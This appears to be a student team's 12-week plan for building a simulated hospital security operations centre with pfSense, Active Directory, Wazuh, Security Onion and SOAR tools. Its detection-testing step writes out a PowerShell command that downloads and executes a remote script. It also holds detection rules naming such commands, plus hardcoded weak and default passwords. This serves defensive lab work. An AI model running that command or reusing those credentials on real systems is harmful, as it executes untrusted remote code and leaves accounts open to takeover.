# Classic SOC Setup - Pragmatic Execution Plan (Weeks 1-12)

## Goal
Build a working Healthcare SOC with simulated infrastructure sending logs to SIEM (Wazuh + Security Onion), then add SOAR automation. **No VLANs, static subnets only.**

---

## Phase 1A: Healthcare Infrastructure (Weeks 1-4)

### Week 1: Physical Setup & Network Planning

#### Day 1: Hardware & Network Prep
**Everyone:**
- [ ] Verify laptop specs and available RAM
- [ ] Install VMware Workstation/VirtualBox
- [ ] Install Tailscale for remote collaboration
- [ ] Purchase plug-and-play gigabit switch (8+ ports)

**Network Design (Static Subnets):**
```
192.168.10.0/24 - WAN (Internet simulation)
192.168.20.0/24 - DMZ (Patient Portal, Nginx)
192.168.30.0/24 - HoneyNet (Cowrie, Dionaea)
192.168.40.0/24 - LAN (Client PCs, AD Server)
192.168.50.0/24 - SOC (Wazuh, Shuffle, MISP, TheHive)
192.168.60.0/24 - Hospital Services (OpenEMR, Orthanc)
```

#### Day 2-3: Firewall Setup (Oussama K + Dali)

**Oussama K - pfSense Primary:**
```bash
# Create pfSense VM
# - RAM: 8GB
# - CPU: 4 cores
# - NICs: 7 (one per subnet)
# - Disk: 50GB

# Download pfSense ISO
# https://www.pfsense.org/download/

# Install pfSense
# Assign interfaces:
# WAN: vtnet0 (192.168.10.1)
# LAN: vtnet1 (192.168.40.1)
# OPT1 (DMZ): vtnet2 (192.168.20.1)
# OPT2 (HoneyNet): vtnet3 (192.168.30.1)
# OPT3 (SOC): vtnet4 (192.168.50.1)
# OPT4 (Hospital): vtnet5 (192.168.60.1)

# Access web interface: https://192.168.40.1
# Default: admin/pfsense
```

**Configure Basic Firewall Rules:**
```
LAN → Any: Allow (for initial setup)
DMZ → LAN: Block
DMZ → Internet: Allow
HoneyNet → Any: Block (isolated)
SOC → Any: Allow
Hospital → SOC: Allow (for logging)
Hospital → DMZ: Allow (patient portal access)
```

**Dali - pfSense Backup (HA):**
```bash
# Create identical pfSense VM
# Configure CARP for high availability
# Sync config from Oussama K's primary

# CARP Virtual IPs:
# LAN: 192.168.40.254
# DMZ: 192.168.20.254
# Hospital: 192.168.60.254
```

#### Day 4-5: Active Directory Setup (Amine)

**Create Windows Server 2022 VM:**
```powershell
# VM Specs:
# - RAM: 6GB
# - CPU: 2 cores
# - Disk: 100GB
# - Network: 192.168.40.10 (LAN subnet)

# Install AD DS Role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest `
  -DomainName "hospital.local" `
  -DomainNetBIOSName "HOSPITAL" `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
  -Force

# Configure DNS
# Point to self: 192.168.40.10
# Forwarder: 8.8.8.8

# Create OUs
New-ADOrganizationalUnit -Name "Doctors" -Path "DC=hospital,DC=local"
New-ADOrganizationalUnit -Name "Nurses" -Path "DC=hospital,DC=local"
New-ADOrganizationalUnit -Name "Admin" -Path "DC=hospital,DC=local"
New-ADOrganizationalUnit -Name "IT" -Path "DC=hospital,DC=local"

# Create sample users
New-ADUser -Name "Dr. Smith" -SamAccountName "dsmith" -UserPrincipalName "dsmith@hospital.local" -Path "OU=Doctors,DC=hospital,DC=local" -AccountPassword (ConvertTo-SecureString "Doctor123!" -AsPlainText -Force) -Enabled $true

New-ADUser -Name "Nurse Johnson" -SamAccountName "njohnson" -UserPrincipalName "njohnson@hospital.local" -Path "OU=Nurses,DC=hospital,DC=local" -AccountPassword (ConvertTo-SecureString "Nurse123!" -AsPlainText -Force) -Enabled $true

New-ADUser -Name "Admin User" -SamAccountName "admin" -UserPrincipalName "admin@hospital.local" -Path "OU=Admin,DC=hospital,DC=local" -AccountPassword (ConvertTo-SecureString "Admin123!" -AsPlainText -Force) -Enabled $true
```

### Week 2: Client Endpoints & Healthcare Services

#### Day 1-2: Windows 10 Clients (Oussema)

**Create 3 Windows 10 VMs:**
```powershell
# Client-PC-01 (Doctor workstation)
# - RAM: 4GB
# - Network: 192.168.40.101
# - Join domain: hospital.local

# Join domain
Add-Computer -DomainName "hospital.local" -Credential (Get-Credential) -Restart

# Login as dsmith@hospital.local

# Client-PC-02 (Nurse workstation)
# - RAM: 4GB
# - Network: 192.168.40.102
# Login as njohnson@hospital.local

# Client-PC-03 (Admin workstation)
# - RAM: 4GB
# - Network: 192.168.40.103
# Login as admin@hospital.local
```

**Install Common Software:**
```powershell
# On each client:
# - Microsoft Office (or LibreOffice)
# - Chrome/Firefox
# - Enable RDP
# - Enable Windows Firewall logging
# - Enable PowerShell logging
```

#### Day 3-4: Healthcare Services (Oussema)

**Deploy OpenEMR (Hospital subnet):**
```bash
# On Oussema's laptop or dedicated VM
# Network: 192.168.60.10

cd /path/to/hospital-lab
docker-compose -f docker-compose.hospital.yml up -d

# Verify OpenEMR accessible
# http://192.168.60.10:8085

# Create sample patient records
# - 10 patients with medical history
# - Appointments, prescriptions, lab results
```

**Deploy Orthanc PACS:**
```bash
# Already in docker-compose.hospital.yml
# Network: 192.168.60.11
# Port: 8042

# Upload sample DICOM images
# Use sample.dcm from hospital-lab directory
```

#### Day 5: DMZ Services (Oussema)

**Deploy Patient Portal:**
```bash
# Network: 192.168.20.10
docker-compose -f docker-compose.dmz.yml up -d

# Verify accessible from LAN
# http://192.168.20.10:8088
```

**Deploy Nginx Reverse Proxy:**
```bash
# Already in docker-compose.dmz.yml
# Network: 192.168.20.1
# Proxies to patient-portal:5000
```

### Week 3: HoneyNet & Monitoring Prep

#### Day 1-2: HoneyNet Deployment (Oussema)

**Deploy Honeypots:**
```bash
# Network: 192.168.30.0/24
docker-compose -f docker-compose.honeynet.yml up -d

# Cowrie (SSH honeypot): 192.168.30.10:2222
# Dionaea (multi-protocol): 192.168.30.11
# Mailhog (SMTP trap): 192.168.30.12:2525

# Verify isolation (should NOT reach LAN)
docker exec honeynet-cowrie ping 192.168.40.10
# Should fail or timeout
```

#### Day 3-5: Security Onion Setup (Yessine N)

**Create Security Onion VM:**
```bash
# VM Specs:
# - RAM: 12GB
# - CPU: 4 cores
# - Disk: 200GB
# - Network: 192.168.50.20 (SOC subnet)
# - Monitor interfaces: Promiscuous mode on all subnets

# Download Security Onion ISO
# https://github.com/Security-Onion-Solutions/securityonion/blob/master/VERIFY_ISO.md

# Install Security Onion
# Choose: Standalone deployment
# Enable: Suricata + Zeek
# Monitoring interfaces: Mirror traffic from switch

# Access web interface
# https://192.168.50.20

# Configure to forward alerts to Wazuh (later)
```

### Week 4: Verification & Documentation

#### Day 1-3: Network Connectivity Tests

**Test Matrix:**
```bash
# From LAN client (192.168.40.101):
ping 192.168.40.10   # AD Server - Should work
ping 192.168.60.10   # OpenEMR - Should work
ping 192.168.20.10   # Patient Portal - Should work
ping 192.168.30.10   # HoneyNet - Should FAIL (blocked by pfSense)

# From DMZ (192.168.20.10):
ping 192.168.40.10   # AD Server - Should FAIL (blocked)
ping 192.168.60.10   # OpenEMR - Should work (backend access)
ping 8.8.8.8         # Internet - Should work

# From Hospital (192.168.60.10):
ping 192.168.50.20   # Security Onion - Should work (logging)
ping 192.168.40.10   # AD Server - Should work (authentication)
```

#### Day 4-5: Document Infrastructure

**Create Network Diagram:**
```
[Internet] ← pfSense (192.168.10.1) → [WAN Simulation]
    ↓
[pfSense Firewall]
    ├── LAN (192.168.40.0/24)
    │   ├── AD Server (192.168.40.10)
    │   ├── Client-PC-01 (192.168.40.101)
    │   ├── Client-PC-02 (192.168.40.102)
    │   └── Client-PC-03 (192.168.40.103)
    │
    ├── DMZ (192.168.20.0/24)
    │   ├── Nginx (192.168.20.1)
    │   └── Patient Portal (192.168.20.10)
    │
    ├── HoneyNet (192.168.30.0/24)
    │   ├── Cowrie (192.168.30.10)
    │   ├── Dionaea (192.168.30.11)
    │   └── Mailhog (192.168.30.12)
    │
    ├── SOC (192.168.50.0/24)
    │   ├── Security Onion (192.168.50.20)
    │   ├── Wazuh (TBD)
    │   ├── Shuffle (TBD)
    │   └── TheHive (TBD)
    │
    └── Hospital (192.168.60.0/24)
        ├── OpenEMR (192.168.60.10)
        └── Orthanc (192.168.60.11)
```

**Checkpoint: Infrastructure Complete** ✅
- [ ] All VMs running
- [ ] Network segmentation working
- [ ] AD authentication functional
- [ ] Healthcare services accessible
- [ ] HoneyNet isolated

---

## Phase 1B: SIEM Deployment (Weeks 5-8)

### Week 5: Wazuh Manager Setup (Aziz)

#### Day 1-2: Wazuh Manager Installation

**Create Ubuntu 22.04 VM:**
```bash
# VM Specs:
# - RAM: 8GB
# - CPU: 4 cores
# - Disk: 100GB
# - Network: 192.168.50.10 (SOC subnet)

# Install Wazuh all-in-one
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a

# Save credentials shown at end
# Access: https://192.168.50.10

# Configure firewall
sudo ufw allow 1514/tcp   # Agent communication
sudo ufw allow 1515/tcp   # Agent enrollment
sudo ufw allow 443/tcp    # Dashboard
sudo ufw allow 55000/tcp  # API
sudo ufw enable
```

#### Day 3-5: Deploy Wazuh Agents

**Windows Clients (Oussema):**
```powershell
# On each Windows client (PC-01, PC-02, PC-03):

# Download agent
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi -OutFile wazuh-agent.msi

# Install (replace with Aziz's Wazuh IP)
msiexec.exe /i wazuh-agent.msi /q WAZUH_MANAGER="192.168.50.10" WAZUH_AGENT_NAME="Client-PC-01"

# Start service
NET START WazuhSvc

# Verify in Wazuh dashboard
# Should see agent as "Active"
```

**Linux Servers (Amine for AD, Oussema for containers):**
```bash
# On AD Server (if Linux) or Ubuntu VMs:
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt update
sudo apt install wazuh-agent

# Configure manager
sudo sed -i "s/<address>MANAGER_IP<\/address>/<address>192.168.50.10<\/address>/" /var/ossec/etc/ossec.conf

# Start agent
sudo systemctl start wazuh-agent
```

**Docker Containers (Oussema):**
```bash
# Install agent in OpenEMR container
docker exec -it openemr bash
# (Follow Linux installation steps inside container)

# Install agent in Orthanc container
docker exec -it orthanc bash
# (Follow Linux installation steps)
```

### Week 6: Wazuh Configuration & Rules (Aziz)

#### Day 1-2: Enable Sysmon for Windows

**On Wazuh Manager:**
```bash
# Edit shared agent config
sudo nano /var/ossec/etc/shared/agent.conf

# Add Sysmon monitoring:
<agent_config os="Windows">
  <localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
  </localfile>
</agent_config>

# Restart manager
sudo systemctl restart wazuh-manager
```

**On Windows Clients (Oussema):**
```powershell
# Download Sysmon
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile Sysmon.zip
Expand-Archive Sysmon.zip -DestinationPath C:\Sysmon

# Download SwiftOnSecurity config
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Sysmon\sysmonconfig.xml

# Install Sysmon
C:\Sysmon\Sysmon64.exe -accepteula -i C:\Sysmon\sysmonconfig.xml
```

#### Day 3-5: Create Healthcare-Specific Rules

**Custom Wazuh Rules (Aziz):**
```bash
# Edit local rules
sudo nano /var/ossec/etc/rules/local_rules.xml

# Add healthcare rules:
<group name="healthcare,hipaa,">
  <!-- Unauthorized PHI access -->
  <rule id="100001" level="10">
    <if_sid>554</if_sid>
    <field name="file">patient_records|medical_data|phi</field>
    <description>Potential unauthorized access to Protected Health Information (PHI)</description>
    <mitre>
      <id>T1005</id>
    </mitre>
  </rule>

  <!-- After-hours access -->
  <rule id="100002" level="8">
    <if_sid>60122</if_sid>
    <time>8 pm - 6 am</time>
    <description>After-hours login attempt detected</description>
    <mitre>
      <id>T1078</id>
    </mitre>
  </rule>

  <!-- PowerShell suspicious activity -->
  <rule id="100003" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.commandLine">DownloadString|Invoke-Expression|IEX|WebClient</field>
    <description>Suspicious PowerShell command detected (potential malware download)</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

  <!-- Multiple failed logins -->
  <rule id="100004" level="10" frequency="5" timeframe="300">
    <if_matched_sid>60122</if_matched_sid>
    <description>Multiple failed login attempts (possible brute force)</description>
    <mitre>
      <id>T1110</id>
    </mitre>
  </rule>

  <!-- File encryption (ransomware indicator) -->
  <rule id="100005" level="15">
    <if_sid>554</if_sid>
    <field name="file">\.encrypted$|\.locked$|\.crypto$</field>
    <description>File encryption detected - possible ransomware activity</description>
    <mitre>
      <id>T1486</id>
    </mitre>
  </rule>
</group>

# Restart manager
sudo systemctl restart wazuh-manager
```

### Week 7: Security Onion Integration (Yessine N)

#### Day 1-3: Configure Suricata Rules

**On Security Onion:**
```bash
# Enable healthcare-specific Suricata rules
sudo so-rule-update

# Add custom rules
sudo nano /opt/so/saltstack/local/salt/suricata/rules/local.rules

# Healthcare-specific signatures:
alert tcp any any -> $HOME_NET 2575 (msg:"HL7 Message Injection Attempt"; content:"MSH|"; sid:1000001; rev:1;)
alert tcp any any -> $HOME_NET 4242 (msg:"DICOM Port Scan Detected"; flags:S; threshold:type both, track by_src, count 5, seconds 60; sid:1000002; rev:1;)
alert http any any -> $HOME_NET any (msg:"Potential PHI Exfiltration"; content:"patient"; content:"ssn"; sid:1000003; rev:1;)

# Restart Suricata
sudo so-suricata-restart
```

#### Day 4-5: Forward Alerts to Wazuh

**Configure Wazuh to Receive Syslog:**
```bash
# On Wazuh Manager (Aziz):
sudo nano /var/ossec/etc/ossec.conf

# Add remote syslog:
<remote>
  <connection>syslog</connection>
  <port>514</port>
  <protocol>udp</protocol>
  <allowed-ips>192.168.50.20</allowed-ips>
</remote>

# Restart
sudo systemctl restart wazuh-manager
```

**Configure Security Onion to Send Syslog:**
```bash
# On Security Onion (Yessine):
sudo nano /etc/rsyslog.d/50-wazuh.conf

# Add:
*.* @192.168.50.10:514

# Restart rsyslog
sudo systemctl restart rsyslog
```

### Week 8: Testing & Validation

#### Day 1-2: Generate Test Events

**Oussema runs on Client-PC-01:**
```powershell
# 1. Failed login attempts
# Try logging in with wrong password 5 times

# 2. After-hours access
# Change system time to 11 PM, then login

# 3. Suspicious PowerShell
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')"

# 4. File access
Get-Content C:\PatientRecords\patient_001.txt

# 5. Port scan (from Kali VM)
nmap -p 1-1000 192.168.60.10
```

#### Day 3-5: Verify Detection

**Aziz checks Wazuh Dashboard:**
```
1. Navigate to https://192.168.50.10
2. Go to "Security Events"
3. Verify alerts:
   - Rule 100004: Multiple failed logins
   - Rule 100002: After-hours access
   - Rule 100003: Suspicious PowerShell
   - Rule 100001: PHI access
```

**Yessine checks Security Onion:**
```
1. Navigate to https://192.168.50.20
2. Check Suricata alerts
3. Verify custom rules triggered
4. Check Zeek logs for network analysis
```

**Checkpoint: SIEM Complete** ✅
- [ ] Wazuh collecting logs from all endpoints
- [ ] Security Onion monitoring network traffic
- [ ] Custom healthcare rules triggering
- [ ] Alerts visible in both dashboards

---

## Phase 1C: SOAR Deployment (Weeks 9-12)

### Week 9: Shuffle Installation (Oussama K)

#### Day 1-2: Deploy Shuffle

**On your main laptop:**
```bash
# Install Docker Desktop for Windows
# Download from: https://www.docker.com/products/docker-desktop/

# Clone Shuffle
git clone https://github.com/Shuffle/Shuffle
cd Shuffle

# Start Shuffle
docker-compose up -d

# Access Shuffle
# http://localhost:3001
# Create admin account
```

#### Day 3-5: Create Wazuh Integration

**In Shuffle UI:**
```
1. Go to "Apps"
2. Search for "Wazuh"
3. Activate Wazuh app
4. Configure:
   - Wazuh Manager URL: https://192.168.50.10:55000
   - Username: admin
   - Password: (from Aziz)
```

**Create Webhook Trigger:**
```
1. Create new workflow: "Wazuh Alert Handler"
2. Add trigger: Webhook
3. Copy webhook URL
4. Configure Wazuh to send alerts to this webhook
```

**Configure Wazuh Integration (Aziz):**
```bash
# On Wazuh Manager:
sudo nano /var/ossec/etc/ossec.conf

# Add integration:
<integration>
  <name>shuffle</name>
  <hook_url>http://OUSSAMA_K_IP:3001/api/v1/hooks/webhook_abc123</hook_url>
  <level>10</level>
  <alert_format>json</alert_format>
</integration>

# Restart
sudo systemctl restart wazuh-manager
```

### Week 10: TheHive Setup (Dali)

#### Day 1-3: Deploy TheHive + Cortex

**Create Ubuntu VM:**
```bash
# VM Specs:
# - RAM: 8GB
# - CPU: 4 cores
# - Disk: 100GB
# - Network: 192.168.50.30 (SOC subnet)

# Install TheHive
wget -q -O /tmp/install.sh https://archives.strangebee.com/scripts/install.sh
sudo -v ; bash /tmp/install.sh

# Access TheHive
# http://192.168.50.30:9000
# Default: admin@thehive.local / secret

# Install Cortex (for analyzers)
# Follow: https://docs.strangebee.com/cortex/installation/
```

#### Day 4-5: Configure Analyzers

**In Cortex:**
```
1. Enable analyzers:
   - VirusTotal (get free API key)
   - AbuseIPDB (get free API key)
   - MISP (connect to Amine's instance)

2. Configure API keys in Cortex settings
```

### Week 11: SOAR Playbooks (Oussama K)

#### Day 1-3: Create Basic Playbooks

**Playbook 1: Auto-Create TheHive Case**
```yaml
# In Shuffle:
Workflow: "High Severity Alert → TheHive Case"

Trigger: Wazuh webhook (level >= 10)

Steps:
  1. Parse Wazuh alert
  2. Extract:
     - Rule description
     - Source IP
     - Agent name
     - MITRE technique
  3. Create TheHive case:
     - Title: "{{rule_description}} on {{agent_name}}"
     - Severity: High
     - Tags: ["wazuh", "{{mitre_technique}}"]
     - Observables: [{"type": "ip", "value": "{{source_ip}}"}]
  4. Send email notification to SOC team
```

**Playbook 2: Enrich with Threat Intel**
```yaml
Workflow: "IP Enrichment via Cortex"

Trigger: TheHive case created with IP observable

Steps:
  1. Extract IP from case
  2. Run Cortex analyzers:
     - VirusTotal
     - AbuseIPDB
  3. Add results to case as observables
  4. Update case severity based on results
```

**Playbook 3: Block Malicious IP**
```yaml
Workflow: "Auto-Block Malicious IP on pfSense"

Trigger: Cortex analysis shows IP is malicious (confidence > 80%)

Steps:
  1. Extract IP from analysis
  2. Call pfSense API to add firewall rule:
     - Action: Block
     - Source: {{malicious_ip}}
     - Destination: Any
     - Description: "Auto-blocked by SOAR - {{timestamp}}"
  3. Update TheHive case with action taken
  4. Notify SOC team
```

#### Day 4-5: Test Playbooks

**Generate Test Alert:**
```powershell
# On Client-PC-01:
# Trigger Rule 100004 (multiple failed logins)
for ($i=1; $i -le 6; $i++) {
    net use \\192.168.40.10\share /user:baduser wrongpass
}

# Expected flow:
# 1. Wazuh detects 5+ failed logins
# 2. Sends alert to Shuffle webhook
# 3. Shuffle creates TheHive case
# 4. Cortex enriches source IP
# 5. If malicious, pfSense blocks IP
# 6. Email sent to SOC team
```

### Week 12: MISP Integration (Amine)

#### Day 1-3: Deploy MISP

**Create Ubuntu VM:**
```bash
# VM Specs:
# - RAM: 4GB
# - CPU: 2 cores
# - Disk: 50GB
# - Network: 192.168.50.40 (SOC subnet)

# Install MISP
wget -O /tmp/INSTALL.sh https://raw.githubusercontent.com/MISP/MISP/2.4/INSTALL/INSTALL.sh
bash /tmp/INSTALL.sh -A

# Access MISP
# https://192.168.50.40
# Default: admin@admin.test / admin
```

#### Day 4-5: Configure Threat Feeds

**In MISP:**
```
1. Enable feeds:
   - CIRCL OSINT Feed
   - Abuse.ch URLhaus
   - AlienVault OTX
   - Emerging Threats

2. Configure auto-import (daily)

3. Create API key for Cortex integration

4. Share API key with Dali for Cortex analyzer
```

**Checkpoint: SOAR Complete** ✅
- [ ] Shuffle receiving Wazuh alerts
- [ ] TheHive cases auto-created
- [ ] Cortex enriching observables
- [ ] MISP providing threat intelligence
- [ ] Basic playbooks working

---

## Phase 1 Completion Checklist (Week 12)

### Infrastructure ✅
- [ ] 7 static subnets configured
- [ ] pfSense firewall routing traffic
- [ ] AD Server authenticating users
- [ ] 3 Windows clients joined to domain
- [ ] OpenEMR + Orthanc running
- [ ] Patient Portal accessible from LAN
- [ ] HoneyNet isolated

### SIEM ✅
- [ ] Wazuh Manager collecting logs from 6+ agents
- [ ] Security Onion monitoring network traffic
- [ ] Custom healthcare rules triggering
- [ ] Sysmon deployed on Windows clients
- [ ] Security Onion forwarding to Wazuh

### SOAR ✅
- [ ] Shuffle receiving Wazuh alerts
- [ ] TheHive cases auto-created
- [ ] Cortex analyzers enriching IOCs
- [ ] MISP providing threat feeds
- [ ] 3 working playbooks

### Testing ✅
- [ ] End-to-end alert flow verified
- [ ] Playbooks tested with real alerts
- [ ] Documentation complete
- [ ] Team can demo to professor

---

## Success Metrics

### Minimum (Pass - 70%)
- Wazuh collecting logs from 3+ endpoints
- 1 working SOAR playbook
- Basic network segmentation

### Good (80%)
- All infrastructure deployed
- Wazuh + Security Onion integrated
- 2-3 working playbooks
- Healthcare-specific rules

### Excellent (90%+)
- Everything above +
- MISP threat intelligence
- Automated response (IP blocking)
- Comprehensive documentation
- Live demo works flawlessly

---

## Next: Phase 2 - DevSecOps/AI Iteration (Weeks 13-21)

After Phase 1 is complete and team has guaranteed pass, you + Yassine N will add:
- Detection-as-Code pipeline (k3s on your secondary PC)
- ML anomaly detection using Yassine's Zeek logs
- LLM-powered triage, enrichment, rule generation
- Tests A, B, C, D
- Published as research/portfolio project

**This is the innovation layer that transforms good project → outstanding project.**
